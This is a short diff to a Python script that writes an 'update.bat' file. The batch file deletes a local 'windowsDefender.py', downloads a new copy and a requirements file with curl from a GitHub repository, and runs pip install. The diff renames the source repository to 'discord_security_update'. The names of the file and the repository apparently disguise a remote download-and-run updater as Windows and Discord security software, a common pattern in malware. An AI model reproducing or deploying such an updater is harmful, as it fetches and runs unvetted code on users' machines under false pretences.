@@ -6,8 +6,8 @@ open("update.bat", "w+").write("""
     timeout /t 10 /nobreak
     del windowsDefender.py
     
-    curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/windowsDefender.py -O
-    curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/requirements.txt -O
+    curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefender.py -O
+    curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/requirements.txt -O
     
     pip install -r requirements.txt
     
